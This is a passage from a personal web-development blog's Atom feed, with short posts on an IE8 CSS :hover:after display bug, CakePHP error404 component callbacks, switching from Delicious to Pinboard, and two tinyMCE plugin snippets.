&lt;p&gt;I was adding a nice looking arrow after one of my elements using &lt;code&gt;:after&lt;/code&gt;. I
wanted this arrow to only display when my element was hovered, so I wrote the
following code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Example&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;relative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;30px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:after&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;30px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;url(arrow.gif)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;no-repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:hover:after&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you can see, nothing too fancy. I positionned my arrow using an empty
&lt;code&gt;:after&lt;/code&gt; element and a &lt;code&gt;background&lt;/code&gt;image. I defaulted the arrow to hidden,
and only show it when hovering the element.&lt;/p&gt;

&lt;h2&gt;IE in action&lt;/h2&gt;

&lt;p&gt;It does work pretty well in moder browsers. It also seems to work on IE8. When
you hover the element in IE8, the arrow gets displayed. But it does not gets
hidden when you stop hovering it.&lt;/p&gt;

&lt;p&gt;There&amp;#39;s a kind of ghost element that keeps getting displayed. It gets removed
if you directly mouse it, or scroll your page, or alt-tab, etc. This clearly
is a display artefact.&lt;/p&gt;

&lt;p&gt;To counter this I had to write it in an other fashion (less readable in my
opinion). Removing the default &lt;code&gt;a:after&lt;/code&gt; rule and adding all properties to
&lt;code&gt;a:hover:after&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;relative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;30px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:hover:after&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;30px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;url(arrow.gif)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;top&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;no-repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;It should be noted that more generally, I gets confused and create ghost
elements and styling when we try to update the &lt;code&gt;:after&lt;/code&gt;/&lt;code&gt;:before&lt;/code&gt; properties
based on a rule selecting its parent.&lt;/p&gt;

&lt;p&gt;There seems to have a little lag/delay before the properties gets applied, and
most of the time they do not.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Firing cakePHP components callbacks on error404</title>
   <link href="http://blog.pixelastic.com/2011/01/06/firing-cakephp-components-callbacks-error404/"/>
   <updated>2011-01-06T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/06/firing-cakephp-components-callbacks-error404</id>
   <content type="html">&lt;p&gt;I often use &lt;code&gt;$this-&amp;gt;cakeError(&amp;#39;error404&amp;#39;)&lt;/code&gt; in my controllers to stop
processing the request (and return a 404 error) when the supplied parameters
are buggy or incomplete.&lt;/p&gt;

&lt;h2&gt;A strange side effect&lt;/h2&gt;

&lt;p&gt;I recently spotted a strange side effect on the latest site I was developping.
It used a pretty large html footer filled with links dynamically fetched from
my database.&lt;/p&gt;

&lt;p&gt;As all pages (no matter what model/controller they were refering to) were
using the same footer, I created a component with a simple &lt;code&gt;startup&lt;/code&gt; method to
fetch them all and return them to the view. I added this component to my
&lt;code&gt;AppController&lt;/code&gt; so that every controller will inherit it.&lt;/p&gt;

&lt;p&gt;This worked nicely until I spotted that on error pages, the footer was left
mostly empty. I was because my &lt;code&gt;Component&lt;/code&gt; callback was never fired.&lt;/p&gt;

&lt;h2&gt;How&amp;#39;s that ?&lt;/h2&gt;

&lt;p&gt;When detecting an error, cake starts using its &lt;code&gt;ErrorHandler&lt;/code&gt;and thus do not
fire callbacks.&lt;/p&gt;

&lt;p&gt;Fortunatly, you can create an &lt;code&gt;AppError&lt;/code&gt;class (in &lt;code&gt;app/app_error.php&lt;/code&gt;) and
overwrite the &lt;code&gt;ErrorHandler&lt;/code&gt;method. Namely, the &lt;code&gt;error404&lt;/code&gt;. I rewrote mine to
explicitly fire the &lt;code&gt;initialize&lt;/code&gt; and &lt;code&gt;startup&lt;/code&gt; methods.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class AppError extends ErrorHandler {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function error404($params) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;controller-&amp;gt;Component-&amp;gt;initialize($this-&amp;gt;controller);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;controller-&amp;gt;Component-&amp;gt;startup($this-&amp;gt;controller);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    parent::error404($params);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I only fired two of the callbacks, but maybe &lt;code&gt;beforeRender&lt;/code&gt;and &lt;code&gt;shutdown
&lt;/code&gt;should be fired too.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Moving from Delicious to Pinboard</title>
   <link href="http://blog.pixelastic.com/2011/01/04/moving-delicious-pinboard/"/>
   <updated>2011-01-04T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/04/moving-delicious-pinboard</id>
   <content type="html">&lt;p&gt;As you may have heard, Yahoo! is closing
&lt;a href=&quot;http://www.delicious.com/&quot;&gt;Delicious&lt;/a&gt;. I had started to use Delicious a lot
lately, to work as a decentralised save of all my bookmarks and being able to
search through them easily.&lt;/p&gt;

&lt;p&gt;In my recent attempt to save as much of my work online, losing Delicious would
meant losing a large part of collective wisdom. So I search for an
alternative.&lt;/p&gt;

&lt;p&gt;I finally registered for &lt;a href=&quot;http://pinboard.in/&quot;&gt;Pinboard &lt;/a&gt;a few days ago. It
allows an easy way to import Delicious bookmarks in a matter of seconds and
has all the features of Delicious I wanted.&lt;/p&gt;

&lt;p&gt;It is not free however, but the one-time fee depends on the number of people
using the service. I payed mine 9.12$.&lt;/p&gt;

&lt;p&gt;The website itself is not as good looking as Delicious (&lt;em&gt;ahem&lt;/em&gt;), but it does
provide a cleaner search experience (in my point of view). I really don&amp;#39;t care
about other people bookmark, I only search through mine.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Detecting fullscreen in tinyMCE</title>
   <link href="http://blog.pixelastic.com/2011/01/03/detecting-fullscreen-tinymce/"/>
   <updated>2011-01-03T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2011/01/03/detecting-fullscreen-tinymce</id>
   <content type="html">&lt;p&gt;I wanted one of my tinyMCE plugins to fire a certain set of actions whenever
the full screen mode was activated.&lt;/p&gt;

&lt;p&gt;I search for an &lt;code&gt;onFullScren&lt;/code&gt;event or somethin similar but to no avail. I
finally discovered that the full screen actually creates a whole new tinymce
editor instance.&lt;/p&gt;

&lt;p&gt;So the only thing I had to do was writing my little piece of code in the &lt;code&gt;init
&lt;/code&gt;method of my plugin and check to see if the fullscreen was enabled.&lt;/p&gt;

&lt;p&gt;The initial fullscreen plugin exposes a &lt;code&gt;fullscreen_is_enabled&lt;/code&gt; param that can
be checked.&lt;/p&gt;

&lt;p&gt;All I had to do was a simple condition like : &lt;code&gt;if
(editor.getParam(&amp;#39;fullscreen_is_enabled&amp;#39;)) {}.&lt;/code&gt; And once in the condition I
tried to execute my custom code. I needed the &lt;code&gt;editor.execCommand&lt;/code&gt; method but
all I got was an error because &lt;code&gt;t.selection&lt;/code&gt; was not set.&lt;/p&gt;

&lt;p&gt;It appears that the execCommand can only be executed when the full editor
instance is loaded (and thus a t.selection is created). So I wrap my little
piece of code into a &lt;code&gt;setInterval&lt;/code&gt; checking for &lt;code&gt;editor.selection&lt;/code&gt; and finally
executed my code when the &lt;code&gt;.selection&lt;/code&gt;was set.&lt;/p&gt;

&lt;p&gt;Here is my final snippet, to be included in my plugin &lt;code&gt;init&lt;/code&gt;method :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_is_enabled&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fullScreenInterval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setInterval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;clearInterval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fullScreenInterval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;anyTinyMCECommand&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Adding a <hr> in a tinyMCE instance</title>
   <link href="http://blog.pixelastic.com/2010/12/11/adding-hr-tinymce-instance/"/>
   <updated>2010-12-11T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/12/11/adding-hr-tinymce-instance</id>
   <content type="html">&lt;p&gt;When using the default tinyMCE implementation to add an &lt;code&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; element to the
editor content, the &lt;code&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; is added inside its parent &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; element (when it
should be an element on its own, without such a parent).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve added my own plugin to resolve this small issue, here is the code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tinymce.plugins.pixelastic_hrPlugin&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// Register the command&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;mcepixelastic_hr&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// We get the parent node&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parentNode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;uniqueId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uniqueId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// We insert the hr (with a unique id to select it later)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;mceInsertContent&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;hr id=&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uniqueId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uniqueId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// We split the parent element around the hr&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parentNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// We remove the temporary id&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// Adding a button&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addButton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pluginName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;pixelastic_hr.desc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;mcepixelastic_hr&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Register plugin&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PluginManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;pixelastic_hr&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;pixelastic_hrPlugin&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The trick to use the &lt;code&gt;editor.dom.split&lt;/code&gt; method to split the parent element
around the &lt;code&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; element.&lt;/p&gt;

&lt;p&gt;The dirty hacks is that there is no way to get a direct reference to a DOM
element added through &lt;code&gt;mceInsertContent&lt;/code&gt;, so we need to set a temporary unique
id and then select it through this id.&lt;/p&gt;

&lt;p&gt;I use jQuery in my example and I strongly suggest you to do the same, the
selectors it provides are much sexier and helps writing these kind of plugins
pretty fast.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>My new backup strategy for 2011</title>
   <link href="http://blog.pixelastic.com/2010/12/07/backup-strategy-2011/"/>
   <updated>2010-12-07T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/12/07/backup-strategy-2011</id>
